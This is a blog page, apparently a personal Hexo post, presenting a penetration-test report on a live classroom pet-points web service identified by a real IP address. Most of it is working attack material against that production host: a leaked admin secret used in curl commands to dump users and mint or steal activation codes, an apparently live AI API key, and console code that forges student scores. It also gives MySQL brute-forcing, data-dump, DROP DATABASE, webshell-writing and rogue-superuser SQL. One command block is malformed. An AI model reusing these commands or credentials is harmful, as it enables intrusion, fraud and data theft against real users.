@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>班级宠物乐园系统漏洞报告 |  ZXCLF</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="/js/pace.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <script src="https://cdn.staticfile.org/mermaid/8.14.0/mermaid.min.js"></script>
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="ZXCLF" type="application/atom+xml">
+</head>
+  </html>
+</html>
+
+<body>
+
+
+<div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Report"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  班级宠物乐园系统漏洞报告
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/20260401/Report/" class="article-date">
+  <time datetime="2026-04-01T04:00:00.000Z" itemprop="datePublished">2026-04-01</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.7k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">7 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="班级宠物乐园系统漏洞报告"><a href="#班级宠物乐园系统漏洞报告" class="headerlink" title="班级宠物乐园系统漏洞报告"></a>班级宠物乐园系统漏洞报告</h1><p><strong>测试对象</strong>: 生产环境 (<a target="_blank" rel="noopener" href="http://43.138.215.11/pet/">http://43.138.215.11/pet/</a>)<br><strong>测试方法</strong>: 代码审计 + 渗透测试</p>
+<hr>
+<h2 id="执行摘要"><a href="#执行摘要" class="headerlink" title="执行摘要"></a>执行摘要</h2><p>本次安全评估发现该系统存在<strong>多个高危安全漏洞</strong>。攻击者可以利用这些漏洞完全控制整个系统，包括：</p>
+<ul>
+<li>未经授权访问所有用户数据</li>
+<li>无限量生成激活码进行非法销售</li>
+<li>禁用任意用户的账号</li>
+<li>篡改学生积分、等级等核心业务数据</li>
+</ul>
+<p><strong>总体风险评级</strong>:  <strong>高危</strong></p>
+<hr>
+<span id="more"></span>
+
+<h2 id="一、漏洞利用分析"><a href="#一、漏洞利用分析" class="headerlink" title="一、漏洞利用分析"></a>一、漏洞利用分析</h2><h3 id="1-1-管理员密钥硬编码"><a href="#1-1-管理员密钥硬编码" class="headerlink" title="1.1 管理员密钥硬编码"></a>1.1 管理员密钥硬编码</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>系统在前端代码中硬编码了管理员后台的访问密钥，<strong>任何用户都可以通过查看网页源代码获取该密钥!!! ∑(ﾟДﾟノ)ノ</strong></p>
+<h4 id="漏洞代码位置"><a href="#漏洞代码位置" class="headerlink" title="漏洞代码位置"></a>漏洞代码位置</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Yx</span> = <span class="string">&quot;petclass_admin_2024&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> xn = &#123;<span class="string">&quot;X-Admin-Secret&quot;</span>: <span class="title class_">Yx</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击步骤演示"><a href="#攻击步骤演示" class="headerlink" title="攻击步骤演示"></a>攻击步骤演示</h4><p><strong>步骤1：获取管理员密钥</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const Yx = <span class="string">&quot;petclass_admin_2024&quot;</span>;</span><br><span class="line">const xn = &#123;<span class="string">&quot;X-Admin-Secret&quot;</span>: Yx&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤2：利用密钥调用管理接口</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取所有用户信息（包含用户名、账号类型、到期时间）</span></span><br><span class="line">curl -X GET http://43.138.215.11:2016/api/admin/users \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤3：生成大量激活码</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成100个半年期激活码</span></span><br><span class="line">curl -X POST http://43.138.215.11:2016/api/admin/generate-codes \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;count&quot;: 100, &quot;codeType&quot;: &quot;half_year&quot;&#125;&#x27;</span></span><br><span class="line">  &#125;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤4：导出所有未使用的激活码</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载所有可用激活码</span></span><br><span class="line">curl -X GET <span class="string">&quot;http://43.138.215.11:2016/api/admin/codes/export?unused_only=true&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -o stolen_codes.csv</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤5：禁用特定用户账号</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过禁用用户使用的激活码，使其账号失效</span></span><br><span class="line">curl -X POST http://43.138.215.11:2016/api/admin/codes/disable \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;code&quot;: &quot;ABCD-1234-EFGH-5678&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击影响"><a href="#攻击影响" class="headerlink" title="攻击影响"></a>攻击影响</h4><ul>
+<li><strong>数据泄露</strong>: 所有注册用户的个人信息完全暴露</li>
+<li><strong>经济损失</strong>: 攻击者可无限生成激活码进行非法销售</li>
+<li><strong>服务中断</strong>: 可随意禁用任意用户账号</li>
+<li><strong>系统被完全控制</strong></li>
+</ul>
+<hr>
+<h3 id="1-2-AI-API密钥泄露"><a href="#1-2-AI-API密钥泄露" class="headerlink" title="1.2 AI API密钥泄露"></a>1.2 AI API密钥泄露</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>系统在前端硬编码了OpenAI API密钥，任何人都可以提取并使用该密钥。</p>
+<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在代码中搜索 vi 变量，可以找到：</span></span><br><span class="line"><span class="keyword">const</span> vi = <span class="string">&quot;sk-6rIQlzl2NDpeeh3skHdI4XKyYorO8gifiGeWymKWrjsooZho&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><p><strong>步骤1：提取API密钥</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在代码中搜索 vi 变量，可以找到：</span></span><br><span class="line"><span class="keyword">const</span> vi = <span class="string">&quot;sk-6rIQlzl2NDpeeh3skHdI4XKyYorO8gifiGeWymKWrjsooZho&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤2：滥用API密钥</strong></p>
+<h4 id="攻击影响-1"><a href="#攻击影响-1" class="headerlink" title="攻击影响"></a>攻击影响</h4><ul>
+<li><strong>经济损失</strong>: 攻击者可产生巨额API调用费用（可能高达数万至数十万美元）</li>
+<li><strong>资源耗尽</strong>: 正常用户的AI功能可能因配额耗尽而无法使用</li>
+<li><strong>服务降级</strong>: API提供方可能因滥用封禁该密钥</li>
+</ul>
+<hr>
+<h3 id="1-3-前端业务逻辑篡改"><a href="#1-3-前端业务逻辑篡改" class="headerlink" title="1.3 前端业务逻辑篡改"></a>1.3 前端业务逻辑篡改</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>核心业务逻辑（积分计算、等级升级、宠物进化）完全在前端实现，攻击者可轻易篡改。</p>
+<h4 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 积分添加函数 - 包含所有业务逻辑</span></span><br><span class="line"><span class="attr">addScore</span>: <span class="function">(<span class="params">n, r</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 计算新积分</span></span><br><span class="line">  <span class="keyword">const</span> c = i.<span class="property">score</span> + r.<span class="property">score</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 计算宠物经验</span></span><br><span class="line">  <span class="keyword">let</span> p = i.<span class="property">petExp</span> + <span class="title class_">Math</span>.<span class="title function_">abs</span>(r.<span class="property">score</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 判断是否升级</span></span><br><span class="line">  <span class="keyword">for</span>(; h &lt; Q &amp;&amp; p &gt;= (l[h] || <span class="number">999</span>);) &#123;</span><br><span class="line">    p -= l[h];</span><br><span class="line">    h++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 计算奖励金币</span></span><br><span class="line">  <span class="keyword">const</span> y = h &gt; i.<span class="property">petLevel</span> ? (h - i.<span class="property">petLevel</span>) * <span class="number">2</span> : <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 返回更新后的数据</span></span><br><span class="line">  <span class="keyword">return</span> &#123; ...i, <span class="attr">score</span>: c, <span class="attr">petExp</span>: p, <span class="attr">petLevel</span>: h, <span class="attr">coins</span>: i.<span class="property">coins</span> + y &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><p><strong>步骤1：定位积分添加函数</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在浏览器控制台找到Zustand store</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="variable language_">window</span>.<span class="property">$REACT_STORE$</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤2：篡改业务逻辑</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法1：直接调用积分函数时传入伪造参数</span></span><br><span class="line">store.<span class="title function_">getState</span>().<span class="title function_">addScore</span>(studentId, &#123; <span class="attr">name</span>: <span class="string">&quot;作弊&quot;</span>, <span class="attr">score</span>: <span class="number">999999</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：修改addScore函数本身</span></span><br><span class="line"><span class="keyword">const</span> originalAddScore = store.<span class="title function_">getState</span>().<span class="property">addScore</span>;</span><br><span class="line">store.<span class="title function_">setState</span>(&#123;</span><br><span class="line">  <span class="attr">addScore</span>: <span class="function">(<span class="params">id, item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 绕过所有检查，直接加10万分</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">originalAddScore</span>(id, &#123; ...item, <span class="attr">score</span>: <span class="number">100000</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法3：直接修改学生数据</span></span><br><span class="line"><span class="keyword">const</span> student = store.<span class="title function_">getState</span>().<span class="property">students</span>.<span class="title function_">find</span>(<span class="function"><span class="params">s</span> =&gt;</span> s.<span class="property">id</span> === targetId);</span><br><span class="line">student.<span class="property">score</span> = <span class="number">999999</span>;</span><br><span class="line">student.<span class="property">petLevel</span> = <span class="number">10</span>;</span><br><span class="line">student.<span class="property">coins</span> = <span class="number">999999</span>;</span><br><span class="line">store.<span class="title function_">setState</span>(&#123; <span class="attr">students</span>: [...store.<span class="title function_">getState</span>().<span class="property">students</span>] &#125;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤3：自动触发保存</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改后的数据会自动同步到服务器</span></span><br><span class="line"><span class="comment">// 因为store监听了变化并调用save接口</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击影响-2"><a href="#攻击影响-2" class="headerlink" title="攻击影响"></a>攻击影响</h4><ul>
+<li><strong>数据完整性破坏</strong>: 学生积分、等级可随意篡改</li>
+<li><strong>公平性丧失</strong>: 排行榜失去意义</li>
+</ul>
+<hr>
+<h3 id="1-4-API接口暴露"><a href="#1-4-API接口暴露" class="headerlink" title="1.4 API接口暴露"></a>1.4 API接口暴露</h3><h4 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>所有后端API接口路径在前端完全暴露，攻击者可以全面探测接口漏洞。</p>
+<h4 id="API接口地图"><a href="#API接口地图" class="headerlink" title="API接口地图"></a>API接口地图</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># 认证接口</span><br><span class="line">POST   /api/auth/login</span><br><span class="line">POST   /api/auth/register</span><br><span class="line">POST   /api/auth/change-password</span><br><span class="line">POST   /api/auth/renew</span><br><span class="line">GET    /api/auth/check</span><br><span class="line"></span><br><span class="line"># 数据接口</span><br><span class="line">GET    /api/data/init</span><br><span class="line">POST   /api/data/students/save</span><br><span class="line">PUT    /api/data/settings</span><br><span class="line">DELETE /api/data/student/&#123;id&#125;</span><br><span class="line">DELETE /api/data/students/by-class/&#123;id&#125;</span><br><span class="line"></span><br><span class="line"># 宠物接口</span><br><span class="line">GET    /api/pet-images</span><br><span class="line">POST   /api/pet-images/save</span><br><span class="line"></span><br><span class="line"># 分享接口</span><br><span class="line">POST   /api/share/create</span><br><span class="line">GET    /api/share/&#123;token&#125;</span><br><span class="line"></span><br><span class="line"># 管理接口（已泄露）</span><br><span class="line">GET    /api/admin/stats</span><br><span class="line">GET    /api/admin/codes</span><br><span class="line">GET    /api/admin/users</span><br><span class="line">POST   /api/admin/generate-codes</span><br><span class="line">GET    /api/admin/codes/export</span><br><span class="line">POST   /api/admin/codes/enable</span><br><span class="line">POST   /api/admin/codes/disable</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-5-端口扫描结果"><a href="#1-5-端口扫描结果" class="headerlink" title="1.5 端口扫描结果"></a>1.5 端口扫描结果</h3><table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>状态</th>
+<th>风险等级</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21</td>
+<td>FTP</td>
+<td><strong>打开</strong></td>
+<td>高危</td>
+<td>文件传输服务</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td><strong>打开</strong></td>
+<td>中危</td>
+<td>远程管理服务</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td><strong>打开</strong></td>
+<td>高危</td>
+<td>Web服务（明文传输）</td>
+</tr>
+<tr>
+<td>443</td>
+<td>HTTPS</td>
+<td><strong>打开</strong></td>
+<td>低危</td>
+<td>Web服务（加密传输）</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MySQL</td>
+<td><strong>打开</strong></td>
+<td>高危</td>
+<td>数据库服务</td>
+</tr>
+</tbody></table>
+<h4 id="端口-3306-MySQL-数据库"><a href="#端口-3306-MySQL-数据库" class="headerlink" title="端口 3306 - MySQL 数据库"></a>端口 3306 - MySQL 数据库</h4><h4 id="风险分析"><a href="#风险分析" class="headerlink" title="风险分析"></a>风险分析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MySQL 直接暴露在公网</span></span><br><span class="line">mysql -h 43.138.215.11 -P 3306 -u root -p</span><br></pre></td></tr></table></figure>
+
+<h5 id="攻击场景-1：弱口令爆破"><a href="#攻击场景-1：弱口令爆破" class="headerlink" title="攻击场景 1：弱口令爆破"></a>攻击场景 1：弱口令爆破</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Hydra 爆破 MySQL</span></span><br><span class="line">hydra -L users.txt -P passwords.txt mysql://43.138.215.11</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见弱口令测试</span></span><br><span class="line">- root:root</span><br><span class="line">- root:123456</span><br><span class="line">- root:password</span><br><span class="line">- admin:admin</span><br><span class="line">- <span class="built_in">test</span>:<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="攻击场景-2：获取完整数据"><a href="#攻击场景-2：获取完整数据" class="headerlink" title="攻击场景 2：获取完整数据"></a>攻击场景 2：获取完整数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 一旦登录成功，攻击者可以：</span></span><br><span class="line"><span class="comment">-- 1. 查看所有数据库</span></span><br><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 获取所有表</span></span><br><span class="line">USE pet_class_db;</span><br><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 导出所有用户数据</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 导出所有学生数据</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 5. 修改数据</span></span><br><span class="line"><span class="keyword">UPDATE</span> students <span class="keyword">SET</span> score <span class="operator">=</span> <span class="number">999999</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 6. 删除数据</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE pet_class_db;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 7. 写入 Webshell</span></span><br><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h5 id="攻击场景-3：权限提升"><a href="#攻击场景-3：权限提升" class="headerlink" title="攻击场景 3：权限提升"></a>攻击场景 3：权限提升</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 如果 MySQL 以 root 权限运行</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建管理员账号</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;hacker&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;hacked&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;hacker&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 读取系统文件</span></span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> temp;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>报告结论</strong>: 服务器配置存在严重安全缺陷，<strong>数据库直接暴露在公网</strong>，加上代码漏洞，系统整体安全评分 <strong>极低</strong>。</p>
+<p><strong>报告撰写</strong>: ZXCLF  </p>
+<p><em>本报告仅用于安全研究和漏洞修复目的，请勿用于非法用途。</em></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://zxclf.github.io/20260401/Report/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/20260306/Homework_Manager/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">作业管理器</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+    
+  
+    <div class="article-inner" style="margin-top: 20px; padding: 0 20px;">
+      <div id="utteranc-container">
+        <script src="https://utteranc.es/client.js"
+            repo="ZXCLF/my-blog-comments"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+        </script>
+      </div>
+    </div>
+    
+  </article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2024-2026
+        <i class="ri-heart-fill heart_icon"></i> ZXCLF
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="ZXCLF"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://github.com/ZXCLF">Github</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/Chrome_Dino/Chrome_Dino">谷歌小恐龙</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
